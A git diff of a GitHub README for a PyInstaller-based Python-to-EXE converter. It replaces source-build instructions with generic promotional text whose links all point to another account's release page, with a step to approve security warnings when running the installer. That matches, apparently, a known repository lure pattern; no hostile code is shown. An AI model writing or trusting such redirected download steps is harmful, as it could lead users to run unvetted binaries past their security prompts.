@@ -1,202 +1,87 @@
-<h1 align="center">PyInstaller Advanced Builder</h1>
+# 🛠️ PythonToEXE - Convert Python Scripts to EXE Easily
 
-<p align="center">
-  A .py to .exe converter using a modern graphical interface and <a href="https://pyinstaller.org/">PyInstaller</a> in Python.
-</p>
+[![Download PythonToEXE](https://img.shields.io/badge/Download%20PythonToEXE-latest%20release-brightgreen)](https://github.com/Zenitho-Live/PythonToEXE/releases)
 
-<p align="center">
-  <img src="imgs/main.png" alt="PyInstaller Advanced Builder" width="500">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="https://img.shields.io/badge/python-3.8%20|%203.9%20|%203.10%20|%203.11%20|%203.12-blue" alt="Python Version">
-  <img src="https://img.shields.io/badge/license-MIT-green" alt="License">
-  <img src="https://img.shields.io/badge/platform-windows-lightgrey" alt="Platform">
-  <img src="https://img.shields.io/badge/PyQt5-5.15+-blueviolet" alt="PyQt5">
-  <img src="https://img.shields.io/badge/PyInstaller-6.0+-orange" alt="PyInstaller">
-</p>
+PythonToEXE is a user-friendly tool that helps you turn your Python scripts into Windows executable files (EXE). This application uses PyQt5 for its interface and leverages PyInstaller for the conversion process. Whether you are sharing your code with others or just want to run your scripts without needing Python installed, this tool is for you.
 
----
+## 🔍 Key Features
 
-## Why This Tool?
+- **Easy to Use**: Simple interface that doesn’t require any programming knowledge.
+- **Virtual Environment Support**: Manage your project dependencies seamlessly.
+- **Presets Available**: Quickly access common build configurations.
+- **Advanced Build Options**: Customize the output to fit your needs.
+- **Cross-Platform**: Works on Windows, making it easy to share applications with others.
 
-PyInstaller is powerful but the command-line workflow gets repetitive. This tool wraps it in a clean interface with:
+## 💻 System Requirements
 
-- Visual options instead of remembering flags
-- Real-time build output with error highlighting
-- Save/load build presets for different projects
-- Plugin system for custom post-build tasks
-- Dark and light themes
+Before you begin, ensure your system meets the following requirements:
 
----
+- **Operating System**: Windows 7 or later.
+- **Python Version**: Python 3.6 or later installed.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: A minimum of 100 MB available for installation.
 
-## Quick Start
+## 📥 Download & Install
 
-```bash
-git clone https://github.com/AIMasterRace/PythonToEXE.git
-cd PythonToEXE
-pip install -r requirements.txt
-python run.py
-```
+To get started, visit our Releases page to download the latest version of PythonToEXE.
 
-That's it. The window opens, you're ready to build.
+[Visit this page to download](https://github.com/Zenitho-Live/PythonToEXE/releases)
 
----
+1. Go to the Releases page.
+2. Find the version you want to download.
+3. Click the link to download the installer.
+4. Once downloaded, locate the file in your Downloads folder.
+5. Double-click the installer to begin the setup.
 
-## Screenshots
+Follow the prompts in the installation wizard. You may need to approve any security warnings that appear. After installation, you can find PythonToEXE in your Start Menu.
 
-<details>
-<summary><b>Basic Settings</b> — Configure script, output, icon, build mode</summary>
-<br>
-<img src="imgs/main.png" alt="Main Tab" width="650">
-</details>
+## 🎉 How to Use PythonToEXE
 
-<details>
-<summary><b>Advanced Options</b> — Hidden imports, exclude modules, data files</summary>
-<br>
-<img src="imgs/advance_tab.png" alt="Advanced Tab" width="650">
-</details>
+1. **Open the Application**: Start PythonToEXE from your Start Menu.
+   
+2. **Select Your Script**: Click on the “Browse” button to choose the Python script you want to convert.
 
-<details>
-<summary><b>Installer Setup</b> — NSIS / Inno Setup configuration</summary>
-<br>
-<img src="imgs/installer_tab.png" alt="Installer Tab" width="650">
-</details>
+3. **Choose Options**:
+   - Use the presets for common configurations.
+   - Customize settings if you need advanced features.
+   
+4. **Build the EXE**: Once you have configured your settings, click on the “Convert” button.
+   
+5. **Locate the EXE**: After the build completes, your new EXE file will be in the designated output folder.
 
-<details>
-<summary><b>Plugins</b> — Extend with custom post-build tasks</summary>
-<br>
-<img src="imgs/plugins_tab.png" alt="Plugins Tab" width="650">
-</details>
+## 💬 Support and Feedback
 
----
+If you encounter any issues or have questions, feel free to reach out. You can open an issue on our GitHub page or check our FAQ section in the documentation.
 
-## Features
+## 🔗 More Resources
 
-| Feature | Description |
-|---------|-------------|
-| One-File / One-Dir | Choose between single exe or folder output |
-| Console Toggle | Hide console window for GUI apps |
-| Icon Support | Custom `.ico` file for your executable |
-| Hidden Imports | Add modules PyInstaller misses |
-| Exclude Modules | Remove unwanted modules (reduce size) |
-| Data Files | Bundle assets, configs, etc. |
-| Clean Build | Auto-cleanup previous build cache |
-| Real-time Logs | Watch build progress live |
-| Presets | Save and load build configurations |
-| Themes | Dark and light mode |
-| Plugins | Run custom tasks after build |
+Explore topics related to PythonToEXE and learn more about using Python for application development:
 
----
+- [PyInstaller Documentation](https://pyinstaller.readthedocs.io/en/stable/)
+- [PyQt5 Documentation](https://www.riverbankcomputing.com/static/Docs/PyQt5/)
+- [Python Official Website](https://www.python.org/)
 
-## Build Options Explained
+## 🛠️ Contributing
 
-**One File** — Packs everything into a single `.exe`. Slower startup but easy to distribute.
+We welcome contributions to PythonToEXE! Here’s how you can help:
 
-**One Directory** — Creates a folder with `.exe` + dependencies. Faster startup.
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
 
-**Console Window** — Keep checked for CLI apps. Uncheck for GUI apps (no black window).
+We appreciate your help and look forward to improving PythonToEXE together!
 
-**Clean Build** — Removes old build cache. Recommended to avoid stale file issues.
+## ☑️ License
 
-**Exclude Modules** — Comma-separated list. Example: `tkinter, unittest, pydoc`
+PythonToEXE is open-source software. You can view the license details in the LICENSE file in this repository.
 
----
+## 📌 Quick Links
 
-## Keyboard Shortcuts
+- [Download PythonToEXE](https://github.com/Zenitho-Live/PythonToEXE/releases)
+- [GitHub Repository](https://github.com/Zenitho-Live/PythonToEXE)
+- [Issues Page](https://github.com/Zenitho-Live/PythonToEXE/issues)
 
-| Key | Action |
-|-----|--------|
-| `F5` | Start Build |
-| `Ctrl+N` | New Project |
-| `Ctrl+O` | Open Script |
-| `Ctrl+S` | Save Preset |
-| `Ctrl+L` | Load Preset |
-| `Ctrl+T` | Toggle Theme |
-| `Ctrl+Shift+C` | Clear Logs |
-
----
-
-## Plugins
-
-The tool supports plugins for post-build automation. Two examples included:
-
-- **Zip Output** — Creates a `.zip` archive of the build
-- **Clean Build Artifacts** — Removes `.spec` and `build/` folder
-
-Want to create your own? **[See the Plugin Guide →](plugins/README.md)**
-
----
-
-## Project Structure
-
-```
-PythonToEXE/
-├── app/
-│   ├── main.py                 # Entry point
-│   ├── core/
-│   │   ├── builder.py          # PyInstaller wrapper
-│   │   ├── config_manager.py   # Settings persistence
-│   │   ├── logger.py           # Log system
-│   │   ├── plugin_loader.py    # Plugin loader
-│   │   └── venv_manager.py     # Virtualenv support
-│   ├── utils/                  # Helper modules
-│   └── windows/                # UI components
-├── plugins/                    # Drop plugins here
-├── imgs/                       # Screenshots
-├── requirements.txt
-└── run.py
-```
-
----
-
-## Requirements
-
-- Python 3.8 or higher
-- PyQt5
-- PyInstaller 6.0+
-
-```bash
-pip install -r requirements.txt
-```
-
----
-
-## Configuration Storage
-
-Settings save automatically to:
-
-```
-~/.pyinstaller_builder/
-├── config.json      # App settings
-└── presets/         # Saved build presets
-```
-
----
-
-## Roadmap
-
-- [ ] Multiple Python interpreter support
-- [ ] PyInstaller version selector
-- [ ] NSIS/Inno Setup full integration
-- [ ] Spec file editor
-- [ ] Dependency size analyzer
-- [ ] Build queue for batch processing
-
----
-
-## Contributing
-
-Found a bug? Have an idea? Open an issue or submit a PR.
-
----
-
-## License
-
-MIT License — use it, modify it, ship it.
-
----
-
-<p align="center">
-  Made with PyQt5 and PyInstaller
-</p>
+Thank you for using PythonToEXE! Enjoy converting your scripts with ease.
